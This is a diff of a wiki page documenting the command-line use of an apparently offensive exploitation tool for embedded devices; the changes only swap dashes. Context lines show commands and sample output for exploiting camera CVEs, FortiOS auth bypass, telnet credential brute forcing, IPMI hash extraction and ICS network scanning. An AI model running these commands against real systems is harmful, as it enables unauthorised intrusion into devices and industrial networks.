@@ -25,19 +25,19 @@ python exf.py      -m <path> -s "<opt> <val>"   # legacy bootstrap
 
 | Flag | Long form | Type | Required | Description |
 |------|-----------|------|----------|-------------|
-| `-h` | `--help` | — | No | Print usage help and exit |
+| `-h` | `--help` |  -  | No | Print usage help and exit |
 | `-m` | `--module` | string | Yes* | Module path, e.g. `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260` |
 | `-s` | `--set` | string | No | Set a module option; repeat for each option (`"option value"` format) |
 | `-T` | `--targets` | string (file path) | No | Multi-target scan from file; each line is an IP or CIDR |
-| `--infra` | — | string | No | Infrastructure type: `wizard`, `ot`, `it`, `soho`, or custom key |
-| `--context` | — | string | No | Operational context for infra mode (e.g. `ics`, `scada`, `dmz`) |
-| `--target` | — | string | No | IP address or CIDR range for the infra scan plan |
+| `--infra` |  -  | string | No | Infrastructure type: `wizard`, `ot`, `it`, `soho`, or custom key |
+| `--context` |  -  | string | No | Operational context for infra mode (e.g. `ics`, `scada`, `dmz`) |
+| `--target` |  -  | string | No | IP address or CIDR range for the infra scan plan |
 
 \* `-m` is required unless using `-T`, `--infra wizard`, or `-h`.
 
 ---
 
-## `-h` / `--help` — usage help
+## `-h` / `--help`  -  usage help
 
 ```bash
 embedxpl -h
@@ -55,13 +55,13 @@ $ embedxpl -h
 
 ---
 
-## `-m` / `--module` — run a single module
+## `-m` / `--module`  -  run a single module
 
 ```bash
 embedxpl -m <module_path> [-s "<option> <value>"] ...
 ```
 
-**Terminal session — basic exploit:**
+**Terminal session  -  basic exploit:**
 
 ```bash
 $ embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
@@ -78,14 +78,14 @@ $ embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
 [!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
 ```
 
-**Error — no module specified:**
+**Error  -  no module specified:**
 
 ```text
 $ embedxpl
 [-] A module is required when running non-interactively
 ```
 
-**Error — unknown module:**
+**Error  -  unknown module:**
 
 ```text
 $ embedxpl -m exploits/cameras/hikvision/does_not_exist
@@ -94,7 +94,7 @@ $ embedxpl -m exploits/cameras/hikvision/does_not_exist
 
 ---
 
-## `-s` / `--set` — set module options
+## `-s` / `--set`  -  set module options
 
 Each `-s` flag takes a **single quoted string** containing `"option_name value"`.
 
@@ -110,11 +110,11 @@ embedxpl -m exploits/cameras/dahua/cctv_rce_cve_2021_36260 \
 **Incorrect format (do not do this):**
 
 ```bash
-# WRONG — multiple options in one -s:
+# WRONG  -  multiple options in one -s:
 embedxpl -m ... -s "target 192.168.1.50 port 80"
 ```
 
-**Values with spaces — quote the entire `-s` argument:**
+**Values with spaces  -  quote the entire `-s` argument:**
 
 ```bash
 embedxpl -m exploits/printers/generic/pjl_info_disclosure \
@@ -124,7 +124,7 @@ embedxpl -m exploits/printers/generic/pjl_info_disclosure \
 
 ---
 
-## `-T` / `--targets` — multi-target scan from file
+## `-T` / `--targets`  -  multi-target scan from file
 
 ```bash
 embedxpl -T <targets_file>
@@ -134,7 +134,7 @@ embedxpl -T <targets_file>
 
 | Parameter | Type | Required | Default | Accepted values | Description |
 |-----------|------|----------|---------|-----------------|-------------|
-| `targets_file` | string (file path) | Yes | — | Readable file path | Path to file with IPs/CIDRs, one per line |
+| `targets_file` | string (file path) | Yes |  -  | Readable file path | Path to file with IPs/CIDRs, one per line |
 
 Targets file format (one entry per line; blank lines and `#` comments are skipped):
 
@@ -154,26 +154,26 @@ $ embedxpl -T /tmp/targets.txt
 [*] Multi-target scan from file: /tmp/targets.txt
 [*] [192.168.1.1] [scanning] Starting ARP/ICMP sweep
 [*] [192.168.1.1] [fingerprint] Probing 192.168.1.1...
-[+] [192.168.1.1] done — 4 modules matched
+[+] [192.168.1.1] done  -  4 modules matched
 [*] [192.168.1.2] [scanning] Starting ARP/ICMP sweep
 [*] [192.168.1.2] [fingerprint] Probing 192.168.1.2...
-[+] [192.168.1.2] done — 2 modules matched
+[+] [192.168.1.2] done  -  2 modules matched
 [*] [10.0.0.0/24] [scanning] Scanning 254 hosts...
 [*] [10.0.0.0/24] [arp] 10.0.0.1 responding
 [*] [10.0.0.0/24] [arp] 10.0.0.5 responding
-[+] [10.0.0.0/24] done — 6 total host(s) found
+[+] [10.0.0.0/24] done  -  6 total host(s) found
 
-Scan complete — 3 target(s), 8 total host(s) found
-  192.168.1.1 — 1 host(s):
-    192.168.1.1: Huawei EG8145X6 [80,443] 78% — 4 modules
-  192.168.1.2 — 1 host(s):
-    192.168.1.2: ZTE H168N [80,23] 65% — 2 modules
-  10.0.0.0/24 — 6 host(s):
-    10.0.0.1: TP-Link Archer C6 [80,443] 82% — 5 modules
+Scan complete  -  3 target(s), 8 total host(s) found
+  192.168.1.1  -  1 host(s):
+    192.168.1.1: Huawei EG8145X6 [80,443] 78%  -  4 modules
+  192.168.1.2  -  1 host(s):
+    192.168.1.2: ZTE H168N [80,23] 65%  -  2 modules
+  10.0.0.0/24  -  6 host(s):
+    10.0.0.1: TP-Link Archer C6 [80,443] 82%  -  5 modules
     ...
 ```
 
-**Error — file not found:**
+**Error  -  file not found:**
 
 ```text
 $ embedxpl -T /tmp/nonexistent.txt
@@ -184,7 +184,7 @@ $ embedxpl -T /tmp/nonexistent.txt
 
 ---
 
-## `--infra wizard` — interactive infrastructure wizard
+## `--infra wizard`  -  interactive infrastructure wizard
 
 ```bash
 embedxpl --infra wizard
@@ -222,7 +222,7 @@ Cancelled with Ctrl+C:
 
 ---
 
-## `--infra` + `--context` + `--target` — infrastructure scan plan
+## `--infra` + `--context` + `--target`  -  infrastructure scan plan
 
 ```bash
 embedxpl --infra <type> --context <context> --target <ip_or_cidr>
@@ -236,7 +236,7 @@ embedxpl --infra <type> --context <context> --target <ip_or_cidr>
 | `--context` | string | No | Operational context within the infra type (e.g. `ics`) |
 | `--target` | string | No | IP or CIDR range |
 
-**Terminal session — OT/ICS scan plan:**
+**Terminal session  -  OT/ICS scan plan:**
 
 ```text
 $ embedxpl --infra ot --context ics --target 192.168.100.0/24
@@ -257,14 +257,14 @@ $ embedxpl --infra ot --context ics --target 192.168.100.0/24
 [*] Or launch interactive shell and type 'use <module>' to explore.
 ```
 
-**Terminal session — unknown infra type:**
+**Terminal session  -  unknown infra type:**
 
 ```text
 $ embedxpl --infra unknown_type --context ics
 [-] Unknown infra type 'unknown_type'. Valid: ot, it, soho, iot
 ```
 
-**Terminal session — valid infra, no context (lists available contexts):**
+**Terminal session  -  valid infra, no context (lists available contexts):**
 
 ```text
 $ embedxpl --infra ot
@@ -308,7 +308,7 @@ embedxpl \
 ```text
 [*] Running module ...
 [*] Probing CVE-2021-36260 indicators at 192.168.1.50...
-[+] [CRITICAL] configManager.cgi accessible without auth — CVE-2021-36260 likely exploitable
+[+] [CRITICAL] configManager.cgi accessible without auth  -  CVE-2021-36260 likely exploitable
 [*] Response preview: Network.Eth0.IPVersion=IPv4...
 [*] Full exploitation requires sending crafted mutate payload to configManager.cgi action=setConfig
 ```
@@ -326,7 +326,7 @@ embedxpl \
 [*] Trying admin:admin on 192.168.1.1:23
 [-] FAIL: admin:admin
 [*] Trying admin:1234 on 192.168.1.1:23
-[+] SUCCESS: admin:1234 — telnet shell obtained
+[+] SUCCESS: admin:1234  -  telnet shell obtained
 ```
 
 ### Firewall auth bypass (FortiOS CVE-2022-40684)
@@ -382,7 +382,7 @@ embedxpl \
 [+] Challenge: 7d2e1a9b...
 [+] SessionID: 4f8c2e1b...
 [+] Accounts found: admin, operator, viewer
-[+] HSLS-2026-001 confirmed — unauthenticated account enumeration successful
+[+] HSLS-2026-001 confirmed  -  unauthenticated account enumeration successful
 ```
 
 ### Herospeed NVR telnet backdoor
@@ -432,7 +432,7 @@ embedxpl \
 [*] Running module ...
 [*] Sending IPMI 2.0 RAKP auth bypass probe to 10.0.1.5:623...
 [+] IPMI hash obtained: $rakp$...
-[+] CVE-2013-4786 confirmed — crack offline with hashcat -m 7300
+[+] CVE-2013-4786 confirmed  -  crack offline with hashcat -m 7300
 ```
 
 ### SNMP community bruteforce
@@ -501,7 +501,7 @@ embedxpl \
 3. **Parallel multi-module scans:** invoke multiple processes, each with a different `-m`, against a shared targets file.
 4. **Use `-T` for batch host scanning:** create a CIDR file and let EmbedXPL-Forge manage parallelism with `max_file_workers=4`.
 5. **Chain with jq for structured output:** the `sessions export <ip>` command emits JSON suitable for jq post-processing.
-6. **Set global state via shell before automation:** open the interactive shell, use `setg target <ip>`, then exit and run non-interactive modules — global opts carry over via the session file.
+6. **Set global state via shell before automation:** open the interactive shell, use `setg target <ip>`, then exit and run non-interactive modules  -  global opts carry over via the session file.
 
 
 [Wiki hub](../README.md)
